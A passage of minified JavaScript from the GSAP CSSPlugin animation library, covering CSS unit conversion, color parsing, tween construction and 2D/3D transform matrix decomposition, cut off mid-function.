            f = 1 === n;
            if (p && (n = -n), f && (n *= 100), "%" === r && i.indexOf("border") !== -1) o = n / 100 * (h ? t.clientWidth: t.clientHeight);
            else {
                if (d.cssText = "border:0 solid red;position:" + U(t, "position") + ";line-height:0;", "%" !== r && u.appendChild && "v" !== r.charAt(0) && "rem" !== r) d[h ? "borderLeftWidth": "borderTopWidth"] = n + r;
                else {
                    if (u = t.parentNode || F.body, l = u._gsCache, c = e.ticker.frame, l && h && l.time === c) return l.width * n / 100;
                    d[h ? "width": "height"] = n + r
                }
                u.appendChild(D),
                o = parseFloat(D[h ? "offsetWidth": "offsetHeight"]),
                u.removeChild(D),
                h && "%" === r && a.cacheWidths !== !1 && (l = u._gsCache = u._gsCache || {},
                l.time = c, l.width = o / n * 100),
                0 !== o || s || (o = V(t, i, n, r, !0))
            }
            return f && (o /= 100),
            p ? -o: o
        },
        G = q.calculateOffset = function(t, e, i) {
            if ("absolute" !== U(t, "position", i)) return 0;
            var n = "left" === e ? "Left": "Top",
            r = U(t, "margin" + n, i);
            return t["offset" + n] - (V(t, e, parseFloat(r), r.replace(x, "")) || 0)
        },
        Z = function(t, e) {
            var i, n, r, s = {};
            if (e = e || Y(t, null)) if (i = e.length) for (; --i > -1;) r = e[i],
            r.indexOf("-transform") !== -1 && Tt !== r || (s[r.replace(/-([a-z])/gi, C)] = e.getPropertyValue(r));
            else for (i in e) i.indexOf("Transform") !== -1 && xt !== i || (s[i] = e[i]);
            else if (e = t.currentStyle || t.style) for (i in e)"string" == typeof i && void 0 === s[i] && (s[i.replace(/-([a-z])/gi, C)] = e[i]);
            return $ || (s.opacity = B(t)),
            n = Lt(t, e, !1),
            s.rotation = n.rotation,
            s.skewX = n.skewX,
            s.scaleX = n.scaleX,
            s.scaleY = n.scaleY,
            s.x = n.x,
            s.y = n.y,
            St && (s.z = n.z, s.rotationX = n.rotationX, s.rotationY = n.rotationY, s.scaleZ = n.scaleZ),
            s.filters && delete s.filters,
            s
        },
        Q = function(t, e, i, n, r) {
            var s, a, o, l = {},
            c = t.style;
            for (a in i)"cssText" !== a && "length" !== a && isNaN(a) && (e[a] !== (s = i[a]) || r && r[a]) && a.indexOf("Origin") === -1 && ("number" != typeof s && "string" != typeof s || (l[a] = "auto" !== s || "left" !== a && "top" !== a ? "" !== s && "auto" !== s && "none" !== s || "string" != typeof e[a] || "" === e[a].replace(w, "") ? s: 0 : G(t, a), void 0 !== c[a] && (o = new dt(c, a, c[a], o))));
            if (n) for (a in n)"className" !== a && (l[a] = n[a]);
            return {
                difs: l,
                firstMPT: o
            }
        },
        J = {
            width: ["Left", "Right"],
            height: ["Top", "Bottom"]
        },
        K = ["marginLeft", "marginRight", "marginTop", "marginBottom"],
        tt = function(t, e, i) {
            if ("svg" === (t.nodeName + "").toLowerCase()) return (i || Y(t))[e] || 0;
            if (t.getCTM && Ft(t)) return t.getBBox()[e] || 0;
            var n = parseFloat("width" === e ? t.offsetWidth: t.offsetHeight),
            r = J[e],
            s = r.length;
            for (i = i || Y(t, null); --s > -1;) n -= parseFloat(U(t, "padding" + r[s], i, !0)) || 0,
            n -= parseFloat(U(t, "border" + r[s] + "Width", i, !0)) || 0;
            return n
        },
        et = function(t, e) {
            if ("contain" === t || "auto" === t || "auto auto" === t) return t + " ";
            null != t && "" !== t || (t = "0 0");
            var i, n = t.split(" "),
            r = t.indexOf("left") !== -1 ? "0%": t.indexOf("right") !== -1 ? "100%": n[0],
            s = t.indexOf("top") !== -1 ? "0%": t.indexOf("bottom") !== -1 ? "100%": n[1];
            if (n.length > 3 && !e) {
                for (n = t.split(", ").join(",").split(","), t = [], i = 0; i < n.length; i++) t.push(et(n[i]));
                return t.join(",")
            }
            return null == s ? s = "center" === r ? "50%": "0": "center" === s && (s = "50%"),
            ("center" === r || isNaN(parseFloat(r)) && (r + "").indexOf("=") === -1) && (r = "50%"),
            t = r + " " + s + (n.length > 2 ? " " + n[2] : ""),
            e && (e.oxp = r.indexOf("%") !== -1, e.oyp = s.indexOf("%") !== -1, e.oxr = "=" === r.charAt(1), e.oyr = "=" === s.charAt(1), e.ox = parseFloat(r.replace(w, "")), e.oy = parseFloat(s.replace(w, "")), e.v = t),
            e || t
        },
        it = function(t, e) {
            return "function" == typeof t && (t = t(v, g)),
            "string" == typeof t && "=" === t.charAt(1) ? parseInt(t.charAt(0) + "1", 10) * parseFloat(t.substr(2)) : parseFloat(t) - parseFloat(e) || 0
        },
        nt = function(t, e) {
            return "function" == typeof t && (t = t(v, g)),
            null == t ? e: "string" == typeof t && "=" === t.charAt(1) ? parseInt(t.charAt(0) + "1", 10) * parseFloat(t.substr(2)) + e: parseFloat(t) || 0
        },
        rt = function(t, e, i, n) {
            var r, s, a, o, l;
            return "function" == typeof t && (t = t(v, g)),
            null == t ? o = e: "number" == typeof t ? o = t: (r = 360, s = t.split("_"), l = "=" === t.charAt(1), a = (l ? parseInt(t.charAt(0) + "1", 10) * parseFloat(s[0].substr(2)) : parseFloat(s[0])) * (t.indexOf("rad") === -1 ? 1 : M) - (l ? 0 : e), s.length && (n && (n[i] = e + a), t.indexOf("short") !== -1 && (a %= r) !== a % (r / 2) && (a = a < 0 ? a + r: a - r), t.indexOf("_cw") !== -1 && a < 0 ? a = (a + 9999999999 * r) % r - (a / r | 0) * r: t.indexOf("ccw") !== -1 && a > 0 && (a = (a - 9999999999 * r) % r - (a / r | 0) * r)), o = e + a),
            o < 1e-6 && o > -1e-6 && (o = 0),
            o
        },
        st = {
            aqua: [0, 255, 255],
            lime: [0, 255, 0],
            silver: [192, 192, 192],
            black: [0, 0, 0],
            maroon: [128, 0, 0],
            teal: [0, 128, 128],
            blue: [0, 0, 255],
            navy: [0, 0, 128],
            white: [255, 255, 255],
            fuchsia: [255, 0, 255],
            olive: [128, 128, 0],
            yellow: [255, 255, 0],
            orange: [255, 165, 0],
            gray: [128, 128, 128],
            purple: [128, 0, 128],
            green: [0, 128, 0],
            red: [255, 0, 0],
            pink: [255, 192, 203],
            cyan: [0, 255, 255],
            transparent: [255, 255, 255, 0]
        },
        at = function(t, e, i) {
            return t = t < 0 ? t + 1 : t > 1 ? t - 1 : t,
            255 * (6 * t < 1 ? e + (i - e) * t * 6 : t < .5 ? i: 3 * t < 2 ? e + (i - e) * (2 / 3 - t) * 6 : e) + .5 | 0
        },
        ot = a.parseColor = function(t, e) {
            var i, n, r, s, a, o, l, c, h, u, d;
            if (t) if ("number" == typeof t) i = [t >> 16, t >> 8 & 255, 255 & t];
            else {
                if ("," === t.charAt(t.length - 1) && (t = t.substr(0, t.length - 1)), st[t]) i = st[t];
                else if ("#" === t.charAt(0)) 4 === t.length && (n = t.charAt(1), r = t.charAt(2), s = t.charAt(3), t = "#" + n + n + r + r + s + s),
                t = parseInt(t.substr(1), 16),
                i = [t >> 16, t >> 8 & 255, 255 & t];
                else if ("hsl" === t.substr(0, 3)) if (i = d = t.match(_), e) {
                    if (t.indexOf("=") !== -1) return t.match(y)
                } else a = Number(i[0]) % 360 / 360,
                o = Number(i[1]) / 100,
                l = Number(i[2]) / 100,
                r = l <= .5 ? l * (o + 1) : l + o - l * o,
                n = 2 * l - r,
                i.length > 3 && (i[3] = Number(t[3])),
                i[0] = at(a + 1 / 3, n, r),
                i[1] = at(a, n, r),
                i[2] = at(a - 1 / 3, n, r);
                else i = t.match(_) || st.transparent;
                i[0] = Number(i[0]),
                i[1] = Number(i[1]),
                i[2] = Number(i[2]),
                i.length > 3 && (i[3] = Number(i[3]))
            } else i = st.black;
            return e && !d && (n = i[0] / 255, r = i[1] / 255, s = i[2] / 255, c = Math.max(n, r, s), h = Math.min(n, r, s), l = (c + h) / 2, c === h ? a = o = 0 : (u = c - h, o = l > .5 ? u / (2 - c - h) : u / (c + h), a = c === n ? (r - s) / u + (r < s ? 6 : 0) : c === r ? (s - n) / u + 2 : (n - r) / u + 4, a *= 60), i[0] = a + .5 | 0, i[1] = 100 * o + .5 | 0, i[2] = 100 * l + .5 | 0),
            i
        },
        lt = function(t, e) {
            var i, n, r, s = t.match(ct) || [],
            a = 0,
            o = s.length ? "": t;
            for (i = 0; i < s.length; i++) n = s[i],
            r = t.substr(a, t.indexOf(n, a) - a),
            a += r.length + n.length,
            n = ot(n, e),
            3 === n.length && n.push(1),
            o += r + (e ? "hsla(" + n[0] + "," + n[1] + "%," + n[2] + "%," + n[3] : "rgba(" + n.join(",")) + ")";
            return o + t.substr(a)
        },
        ct = "(?:\\b(?:(?:rgb|rgba|hsl|hsla)\\(.+?\\))|\\B#(?:[0-9a-f]{3}){1,2}\\b";
        for (c in st) ct += "|" + c + "\\b";
        ct = new RegExp(ct + ")", "gi"),
        a.colorStringFilter = function(t) {
            var e, i = t[0] + t[1];
            ct.test(i) && (e = i.indexOf("hsl(") !== -1 || i.indexOf("hsla(") !== -1, t[0] = lt(t[0], e), t[1] = lt(t[1], e)),
            ct.lastIndex = 0
        },
        e.defaultStringFilter || (e.defaultStringFilter = a.colorStringFilter);
        var ht = function(t, e, i, n) {
            if (null == t) return function(t) {
                return t
            };
            var r, s = e ? (t.match(ct) || [""])[0] : "",
            a = t.split(s).join("").match(b) || [],
            o = t.substr(0, t.indexOf(a[0])),
            l = ")" === t.charAt(t.length - 1) ? ")": "",
            c = t.indexOf(" ") !== -1 ? " ": ",",
            h = a.length,
            u = h > 0 ? a[0].replace(_, "") : "";
            return h ? r = e ?
            function(t) {
                var e, d, p, f;
                if ("number" == typeof t) t += u;
                else if (n && R.test(t)) {
                    for (f = t.replace(R, "|").split("|"), p = 0; p < f.length; p++) f[p] = r(f[p]);
                    return f.join(",")
                }
                if (e = (t.match(ct) || [s])[0], d = t.split(e).join("").match(b) || [], p = d.length, h > p--) for (; ++p < h;) d[p] = i ? d[(p - 1) / 2 | 0] : a[p];
                return o + d.join(c) + c + e + l + (t.indexOf("inset") !== -1 ? " inset": "")
            }: function(t) {
                var e, s, d;
                if ("number" == typeof t) t += u;
                else if (n && R.test(t)) {
                    for (s = t.replace(R, "|").split("|"), d = 0; d < s.length; d++) s[d] = r(s[d]);
                    return s.join(",")
                }
                if (e = t.match(b) || [], d = e.length, h > d--) for (; ++d < h;) e[d] = i ? e[(d - 1) / 2 | 0] : a[d];
                return o + e.join(c) + l
            }: function(t) {
                return t
            }
        },
        ut = function(t) {
            return t = t.split(","),
            function(e, i, n, r, s, a, o) {
                var l, c = (i + "").split(" ");
                for (o = {},
                l = 0; l < 4; l++) o[t[l]] = c[l] = c[l] || c[(l - 1) / 2 >> 0];
                return r.parse(e, o, s, a)
            }
        },
        dt = (q._setPluginRatio = function(t) {
            this.plugin.setRatio(t);
            for (var e, i, n, r, s, a = this.data,
            o = a.proxy,
            l = a.firstMPT; l;) e = o[l.v],
            l.r ? e = Math.round(e) : e < 1e-6 && e > -1e-6 && (e = 0),
            l.t[l.p] = e,
            l = l._next;
            if (a.autoRotate && (a.autoRotate.rotation = a.mod ? a.mod(o.rotation, this.t) : o.rotation), 1 === t || 0 === t) for (l = a.firstMPT, s = 1 === t ? "e": "b"; l;) {
                if (i = l.t, i.type) {
                    if (1 === i.type) {
                        for (r = i.xs0 + i.s + i.xs1, n = 1; n < i.l; n++) r += i["xn" + n] + i["xs" + (n + 1)];
                        i[s] = r
                    }
                } else i[s] = i.s + i.xs0;
                l = l._next
            }
        },
        function(t, e, i, n, r) {
            this.t = t,
            this.p = e,
            this.v = i,
            this.r = r,
            n && (n._prev = this, this._next = n)
        }),
        pt = (q._parseToProxy = function(t, e, i, n, r, s) {
            var a, o, l, c, h, u = n,
            d = {},
            p = {},
            f = i._transform,
            m = E;
            for (i._transform = null, E = e, n = h = i.parse(t, e, n, r), E = m, s && (i._transform = f, u && (u._prev = null, u._prev && (u._prev._next = null))); n && n !== u;) {
                if (n.type <= 1 && (o = n.p, p[o] = n.s + n.c, d[o] = n.s, s || (c = new dt(n, "s", o, c, n.r), n.c = 0), 1 === n.type)) for (a = n.l; --a > 0;) l = "xn" + a,
                o = n.p + "_" + l,
                p[o] = n.data[l],
                d[o] = n[l],
                s || (c = new dt(n, l, o, c, n.rxp[l]));
                n = n._next
            }
            return {
                proxy: d,
                end: p,
                firstMPT: c,
                pt: h
            }
        },
        q.CSSPropTween = function(t, e, n, r, a, o, l, c, h, u, d) {
            this.t = t,
            this.p = e,
            this.s = n,
            this.c = r,
            this.n = l || e,
            t instanceof pt || s.push(this.n),
            this.r = c,
            this.type = o || 0,
            h && (this.pr = h, i = !0),
            this.b = void 0 === u ? n: u,
            this.e = void 0 === d ? n + r: d,
            a && (this._next = a, a._prev = this)
        }),
        ft = function(t, e, i, n, r, s) {
            var a = new pt(t, e, i, n - i, r, -1, s);
            return a.b = i,
            a.e = a.xs0 = n,
            a
        },
        mt = a.parseComplex = function(t, e, i, n, r, s, o, l, c, u) {
            i = i || s || "",
            "function" == typeof n && (n = n(v, g)),
            o = new pt(t, e, 0, 0, o, u ? 2 : 1, null, !1, l, i, n),
            n += "",
            r && ct.test(n + i) && (n = [i, n], a.colorStringFilter(n), i = n[0], n = n[1]);
            var d, p, f, m, b, w, x, T, k, S, C, P, A, O = i.split(", ").join(",").split(" "),
            M = n.split(", ").join(",").split(" "),
            E = O.length,
            z = h !== !1;
            for (n.indexOf(",") === -1 && i.indexOf(",") === -1 || (O = O.join(" ").replace(R, ", ").split(" "), M = M.join(" ").replace(R, ", ").split(" "), E = O.length), E !== M.length && (O = (s || "").split(" "), E = O.length), o.plugin = c, o.setRatio = u, ct.lastIndex = 0, d = 0; d < E; d++) if (m = O[d], b = M[d], (T = parseFloat(m)) || 0 === T) o.appendXtra("", T, it(b, T), b.replace(y, ""), z && b.indexOf("px") !== -1, !0);
            else if (r && ct.test(m)) P = b.indexOf(")") + 1,
            P = ")" + (P ? b.substr(P) : ""),
            A = b.indexOf("hsl") !== -1 && $,
            m = ot(m, A),
            b = ot(b, A),
            k = m.length + b.length > 6,
            k && !$ && 0 === b[3] ? (o["xs" + o.l] += o.l ? " transparent": "transparent", o.e = o.e.split(M[d]).join("transparent")) : ($ || (k = !1), A ? o.appendXtra(k ? "hsla(": "hsl(", m[0], it(b[0], m[0]), ",", !1, !0).appendXtra("", m[1], it(b[1], m[1]), "%,", !1).appendXtra("", m[2], it(b[2], m[2]), k ? "%,": "%" + P, !1) : o.appendXtra(k ? "rgba(": "rgb(", m[0], b[0] - m[0], ",", !0, !0).appendXtra("", m[1], b[1] - m[1], ",", !0).appendXtra("", m[2], b[2] - m[2], k ? ",": P, !0), k && (m = m.length < 4 ? 1 : m[3], o.appendXtra("", m, (b.length < 4 ? 1 : b[3]) - m, P, !1))),
            ct.lastIndex = 0;
            else if (w = m.match(_)) {
                if (! (x = b.match(y)) || x.length !== w.length) return o;
                for (f = 0, p = 0; p < w.length; p++) C = w[p],
                S = m.indexOf(C, f),
                o.appendXtra(m.substr(f, S - f), Number(C), it(x[p], C), "", z && "px" === m.substr(S + C.length, 2), 0 === p),
                f = S + C.length;
                o["xs" + o.l] += m.substr(f)
            } else o["xs" + o.l] += o.l || o["xs" + o.l] ? " " + b: b;
            if (n.indexOf("=") !== -1 && o.data) {
                for (P = o.xs0 + o.data.s, d = 1; d < o.l; d++) P += o["xs" + d] + o.data["xn" + d];
                o.e = P + o["xs" + d]
            }
            return o.l || (o.type = -1, o.xs0 = o.e),
            o.xfirst || o
        },
        gt = 9;
        for (c = pt.prototype, c.l = c.pr = 0; --gt > 0;) c["xn" + gt] = 0,
        c["xs" + gt] = "";
        c.xs0 = "",
        c._next = c._prev = c.xfirst = c.data = c.plugin = c.setRatio = c.rxp = null,
        c.appendXtra = function(t, e, i, n, r, s) {
            var a = this,
            o = a.l;
            return a["xs" + o] += s && (o || a["xs" + o]) ? " " + t: t || "",
            i || 0 === o || a.plugin ? (a.l++, a.type = a.setRatio ? 2 : 1, a["xs" + a.l] = n || "", o > 0 ? (a.data["xn" + o] = e + i, a.rxp["xn" + o] = r, a["xn" + o] = e, a.plugin || (a.xfirst = new pt(a, "xn" + o, e, i, a.xfirst || a, 0, a.n, r, a.pr), a.xfirst.xs0 = 0), a) : (a.data = {
                s: e + i
            },
            a.rxp = {},
            a.s = e, a.c = i, a.r = r, a)) : (a["xs" + o] += e + (n || ""), a)
        };
        var vt = function(t, e) {
            e = e || {},
            this.p = e.prefix ? H(t) || t: t,
            l[t] = l[this.p] = this,
            this.format = e.formatter || ht(e.defaultValue, e.color, e.collapsible, e.multi),
            e.parser && (this.parse = e.parser),
            this.clrs = e.color,
            this.multi = e.multi,
            this.keyword = e.keyword,
            this.dflt = e.defaultValue,
            this.pr = e.priority || 0
        },
        _t = q._registerComplexSpecialProp = function(t, e, i) {
            "object" != typeof e && (e = {
                parser: i
            });
            var n, r = t.split(","),
            s = e.defaultValue;
            for (i = i || [s], n = 0; n < r.length; n++) e.prefix = 0 === n && e.prefix,
            e.defaultValue = i[n] || s,
            new vt(r[n], e)
        },
        yt = q._registerPluginProp = function(t) {
            if (!l[t]) {
                var e = t.charAt(0).toUpperCase() + t.substr(1) + "Plugin";
                _t(t, {
                    parser: function(t, i, n, r, s, a, c) {
                        var h = o.com.greensock.plugins[e];
                        return h ? (h._cssRegister(), l[n].parse(t, i, n, r, s, a, c)) : (j("Error: " + e + " js file not loaded."), s)
                    }
                })
            }
        };
        c = vt.prototype,
        c.parseComplex = function(t, e, i, n, r, s) {
            var a, o, l, c, h, u, d = this.keyword;
            if (this.multi && (R.test(i) || R.test(e) ? (o = e.replace(R, "|").split("|"), l = i.replace(R, "|").split("|")) : d && (o = [e], l = [i])), l) {
                for (c = l.length > o.length ? l.length: o.length, a = 0; a < c; a++) e = o[a] = o[a] || this.dflt,
                i = l[a] = l[a] || this.dflt,
                d && (h = e.indexOf(d), u = i.indexOf(d), h !== u && (u === -1 ? o[a] = o[a].split(d).join("") : h === -1 && (o[a] += " " + d)));
                e = o.join(", "),
                i = l.join(", ")
            }
            return mt(t, this.p, e, i, this.clrs, this.dflt, n, this.pr, r, s)
        },
        c.parse = function(t, e, i, n, s, a, o) {
            return this.parseComplex(t.style, this.format(U(t, this.p, r, !1, this.dflt)), this.format(e), s, a)
        },
        a.registerSpecialProp = function(t, e, i) {
            _t(t, {
                parser: function(t, n, r, s, a, o, l) {
                    var c = new pt(t, r, 0, 0, a, 2, r, !1, i);
                    return c.plugin = o,
                    c.setRatio = e(t, n, s._tween, r),
                    c
                },
                priority: i
            })
        },
        a.useSVGTransformAttr = !0;
        var bt, wt = "scaleX,scaleY,scaleZ,x,y,z,skewX,skewY,rotation,rotationX,rotationY,perspective,xPercent,yPercent".split(","),
        xt = H("transform"),
        Tt = W + "transform",
        kt = H("transformOrigin"),
        St = null !== H("perspective"),
        Ct = q.Transform = function() {
            this.perspective = parseFloat(a.defaultTransformPerspective) || 0,
            this.force3D = !(a.defaultForce3D === !1 || !St) && (a.defaultForce3D || "auto")
        },
        Pt = _gsScope.SVGElement,
        Rt = function(t, e, i) {
            var n, r = F.createElementNS("http://www.w3.org/2000/svg", t);
            for (n in i) r.setAttributeNS(null, n.replace(/([a-z])([A-Z])/g, "$1-$2").toLowerCase(), i[n]);
            return e.appendChild(r),
            r
        },
        At = F.documentElement || {},
        Ot = function() {
            var t, e, i, n = m || /Android/i.test(N) && !_gsScope.chrome;
            return F.createElementNS && !n && (t = Rt("svg", At), e = Rt("rect", t, {
                width: 100,
                height: 50,
                x: 100
            }), i = e.getBoundingClientRect().width, e.style[kt] = "50% 50%", e.style[xt] = "scaleX(0.5)", n = i === e.getBoundingClientRect().width && !(p && St), At.removeChild(t)),
            n
        } (),
        Mt = function(t, e, i, n, r, s) {
            var o, l, c, h, u, d, p, f, m, g, v, _, y, b, w = t._gsTransform,
            x = Dt(t, !0);
            w && (y = w.xOrigin, b = w.yOrigin),
            (!n || (o = n.split(" ")).length < 2) && (p = t.getBBox(), 0 === p.x && 0 === p.y && p.width + p.height === 0 && (p = {
                x: parseFloat(t.hasAttribute("x") ? t.getAttribute("x") : t.hasAttribute("cx") ? t.getAttribute("cx") : 0) || 0,
                y: parseFloat(t.hasAttribute("y") ? t.getAttribute("y") : t.hasAttribute("cy") ? t.getAttribute("cy") : 0) || 0,
                width: 0,
                height: 0
            }), e = et(e).split(" "), o = [(e[0].indexOf("%") !== -1 ? parseFloat(e[0]) / 100 * p.width: parseFloat(e[0])) + p.x, (e[1].indexOf("%") !== -1 ? parseFloat(e[1]) / 100 * p.height: parseFloat(e[1])) + p.y]),
            i.xOrigin = h = parseFloat(o[0]),
            i.yOrigin = u = parseFloat(o[1]),
            n && x !== It && (d = x[0], p = x[1], f = x[2], m = x[3], g = x[4], v = x[5], (_ = d * m - p * f) && (l = h * (m / _) + u * ( - f / _) + (f * v - m * g) / _, c = h * ( - p / _) + u * (d / _) - (d * v - p * g) / _, h = i.xOrigin = o[0] = l, u = i.yOrigin = o[1] = c)),
            w && (s && (i.xOffset = w.xOffset, i.yOffset = w.yOffset, w = i), r || r !== !1 && a.defaultSmoothOrigin !== !1 ? (l = h - y, c = u - b, w.xOffset += l * x[0] + c * x[2] - l, w.yOffset += l * x[1] + c * x[3] - c) : w.xOffset = w.yOffset = 0),
            s || t.setAttribute("data-svg-origin", o.join(" "))
        },
        Et = function(t) {
            var e, i = I("svg", this.ownerSVGElement.getAttribute("xmlns") || "http://www.w3.org/2000/svg"),
            n = this.parentNode,
            r = this.nextSibling,
            s = this.style.cssText;
            if (At.appendChild(i), i.appendChild(this), this.style.display = "block", t) try {
                e = this.getBBox(),
                this._originalGetBBox = this.getBBox,
                this.getBBox = Et
            } catch(t) {} else this._originalGetBBox && (e = this._originalGetBBox());
            return r ? n.insertBefore(this, r) : n.appendChild(this),
            At.removeChild(i),
            this.style.cssText = s,
            e
        },
        zt = function(t) {
            try {
                return t.getBBox()
            } catch(e) {
                return Et.call(t, !0)
            }
        },
        Ft = function(t) {
            return ! (! (Pt && t.getCTM && zt(t)) || t.parentNode && !t.ownerSVGElement)
        },
        It = [1, 0, 0, 1, 0, 0],
        Dt = function(t, e) {
            var i, n, r, s, a, o, l = t._gsTransform || new Ct,
            c = t.style;
            if (xt ? n = U(t, Tt, null, !0) : t.currentStyle && (n = t.currentStyle.filter.match(/(M11|M12|M21|M22)=[\d\-\.e]+/gi), n = n && 4 === n.length ? [n[0].substr(4), Number(n[2].substr(4)), Number(n[1].substr(4)), n[3].substr(4), l.x || 0, l.y || 0].join(",") : ""), i = !n || "none" === n || "matrix(1, 0, 0, 1, 0, 0)" === n, i && xt && ((o = "none" === Y(t).display) || !t.parentNode) && (o && (s = c.display, c.display = "block"), t.parentNode || (a = 1, At.appendChild(t)), n = U(t, Tt, null, !0), i = !n || "none" === n || "matrix(1, 0, 0, 1, 0, 0)" === n, s ? c.display = s: o && Bt(c, "display"), a && At.removeChild(t)), (l.svg || t.getCTM && Ft(t)) && (i && (c[xt] + "").indexOf("matrix") !== -1 && (n = c[xt], i = 0), r = t.getAttribute("transform"), i && r && (r.indexOf("matrix") !== -1 ? (n = r, i = 0) : r.indexOf("translate") !== -1 && (n = "matrix(1,0,0,1," + r.match(/(?:\-|\b)[\d\-\.e]+\b/gi).join(",") + ")", i = 0))), i) return It;
            for (r = (n || "").match(_) || [], gt = r.length; --gt > -1;) s = Number(r[gt]),
            r[gt] = (a = s - (s |= 0)) ? (1e5 * a + (a < 0 ? -.5 : .5) | 0) / 1e5 + s: s;
            return e && r.length > 6 ? [r[0], r[1], r[4], r[5], r[12], r[13]] : r
        },
        Lt = q.getTransform = function(t, i, n, r) {
            if (t._gsTransform && n && !r) return t._gsTransform;
            var s, o, l, c, h, u, d = n ? t._gsTransform || new Ct: new Ct,
            p = d.scaleX < 0,
            f = St ? parseFloat(U(t, kt, i, !1, "0 0 0").split(" ")[2]) || d.zOrigin || 0 : 0,
            m = parseFloat(a.defaultTransformPerspective) || 0;
            if (d.svg = !(!t.getCTM || !Ft(t)), d.svg && (Mt(t, U(t, kt, i, !1, "50% 50%") + "", d, t.getAttribute("data-svg-origin")), bt = a.useSVGTransformAttr || Ot), (s = Dt(t)) !== It) {
                if (16 === s.length) {
                    var g, v, _, y, b, w = s[0],
                    x = s[1],
                    T = s[2],
                    k = s[3],
                    S = s[4],
                    C = s[5],
                    P = s[6],
                    R = s[7],
                    A = s[8],
                    O = s[9],
                    E = s[10],
                    z = s[12],
                    F = s[13],
                    I = s[14],
                    D = s[11],
                    L = Math.atan2(P, E);
                    d.zOrigin && (I = -d.zOrigin, z = A * I - s[12], F = O * I - s[13], I = E * I + d.zOrigin - s[14]),
                    d.rotationX = L * M,
                    L && (y = Math.cos( - L), b = Math.sin( - L), g = S * y + A * b, v = C * y + O * b, _ = P * y + E * b, A = S * -b + A * y, O = C * -b + O * y, E = P * -b + E * y, D = R * -b + D * y, S = g, C = v, P = _),
                    L = Math.atan2( - T, E),
                    d.rotationY = L * M,
                    L && (y = Math.cos( - L), b = Math.sin( - L), g = w * y - A * b, v = x * y - O * b, _ = T * y - E * b, O = x * b + O * y, E = T * b + E * y, D = k * b + D * y, w = g, x = v, T = _),
                    L = Math.atan2(x, w),
                    d.rotation = L * M,
                    L && (y = Math.cos( - L), b = Math.sin( - L), w = w * y + S * b, v = x * y + C * b, C = x * -b + C * y, P = T * -b + P * y, x = v),
                    d.rotationX && Math.abs(d.rotationX) + Math.abs(d.rotation) > 359.9 && (d.rotationX = d.rotation = 0, d.rotationY = 180 - d.rotationY),
                    d.scaleX = (1e5 * Math.sqrt(w * w + x * x) + .5 | 0) / 1e5,
                    d.scaleY = (1e5 * Math.sqrt(C * C + O * O) + .5 | 0) / 1e5,
                    d.scaleZ = (1e5 * Math.sqrt(P * P + E * E) + .5 | 0) / 1e5,
                    d.rotationX || d.rotationY ? d.skewX = 0 : (d.skewX = S || C ? Math.atan2(S, C) * M + d.rotation: d.skewX || 0, Math.abs(d.skewX) > 90 && Math.abs(d.skewX) < 270 && (p ? (d.scaleX *= -1, d.skewX += d.rotation <= 0 ? 180 : -180, d.rotation += d.rotation <= 0 ? 180 : -180) : (d.scaleY *= -1, d.skewX += d.skewX <= 0 ? 180 : -180))),
                    d.perspective = D ? 1 / (D < 0 ? -D: D) : 0,
                    d.x = z,
                    d.y = F,
                    d.z = I,
                    d.svg && (d.x -= d.xOrigin - (d.xOrigin * w - d.yOrigin * S), d.y -= d.yOrigin - (d.yOrigin * x - d.xOrigin * C))
                } else if (!St || r || !s.length || d.x !== s[4] || d.y !== s[5] || !d.rotationX && !d.rotationY) {
                    var q = s.length >= 6,
                    N = q ? s[0] : 1,
                    $ = s[1] || 0,
                    B = s[2] || 0,
                    j = q ? s[3] : 1;
                    d.x = s[4] || 0,
                    d.y = s[5] || 0,
                    l = Math.sqrt(N * N + $ * $),
                    c = Math.sqrt(j * j + B * B),
                    h = N || $ ? Math.atan2($, N) * M: d.rotation || 0,
                    u = B || j ? Math.atan2(B, j) * M + h: d.skewX || 0,
                    Math.abs(u) > 90 && Math.abs(u) < 270 && (p ? (l *= -1, u += h <= 0 ? 180 : -180, h += h <= 0 ? 180 : -180) : (c *= -1, u += u <= 0 ? 180 : -180)),
                    d.scaleX = l,
                    d.scaleY = c,
                    d.rotation = h,
                    d.skewX = u,
                    St && (d.rotationX = d.rotationY = d.z = 0, d.perspective = m, d.scaleZ = 1),
                    d.svg && (d.x -= d.xOrigin - (d.xOrigin * N + d.yOrigin * B), d.y -= d.yOrigin - (d.xOrigin * $ + d.yOrigin * j))
                }
                d.zOrigin = f;
                for (o in d) d[o] < 2e-5 && d[o] > -2e-5 && (d[o] = 0)
            }
            return n && (t._gsTransform = d, d.svg && (bt && t.style[xt] ? e.delayedCall(.001,
            function() {
                Bt(t.style, xt)
            }) : !bt && t.getAttribute("transform") && e.delayedCall(.001,
            function() {
                t.removeAttribute("transform")
            }))),
            d
        },
        qt = function(t) {
            var e, i, n = this.data,
            r = -n.rotation * O,
            s = r + n.skewX * O,
            a = (Math.cos(r) * n.scaleX * 1e5 | 0) / 1e5,
            o = (Math.sin(r) * n.scaleX * 1e5 | 0) / 1e5,
            l = (Math.sin(s) * -n.scaleY * 1e5 | 0) / 1e5,
            c = (Math.cos(s) * n.scaleY * 1e5 | 0) / 1e5,
            h = this.t.style,
            u = this.t.currentStyle;
            if (u) {
                i = o,
                o = -l,
                l = -i,
                e = u.filter,
                h.filter = "";
                var d, p, f = this.t.offsetWidth,
                g = this.t.offsetHeight,
                v = "absolute" !== u.position,
                _ = "progid:DXImageTransform.Microsoft.Matrix(M11=" + a + ", M12=" + o + ", M21=" + l + ", M22=" + c,
                y = n.x + f * n.xPercent / 100,
                b = n.y + g * n.yPercent / 100;
                if (null != n.ox && (d = (n.oxp ? f * n.ox * .01 : n.ox) - f / 2, p = (n.oyp ? g * n.oy * .01 : n.oy) - g / 2, y += d - (d * a + p * o), b += p - (d * l + p * c)), v ? (d = f / 2, p = g / 2, _ += ", Dx=" + (d - (d * a + p * o) + y) + ", Dy=" + (p - (d * l + p * c) + b) + ")") : _ += ", sizingMethod='auto expand')", e.indexOf("DXImageTransform.Microsoft.Matrix(") !== -1 ? h.filter = e.replace(/progid\:DXImageTransform\.Microsoft\.Matrix\(.+?\)/i, _) : h.filter = _ + " " + e, 0 !== t && 1 !== t || 1 === a && 0 === o && 0 === l && 1 === c && (v && _.indexOf("Dx=0, Dy=0") === -1 || T.test(e) && 100 !== parseFloat(RegExp.$1) || e.indexOf(e.indexOf("Alpha")) === -1 && h.removeAttribute("filter")), !v) {
                    var w, k, S, C = m < 8 ? 1 : -1;
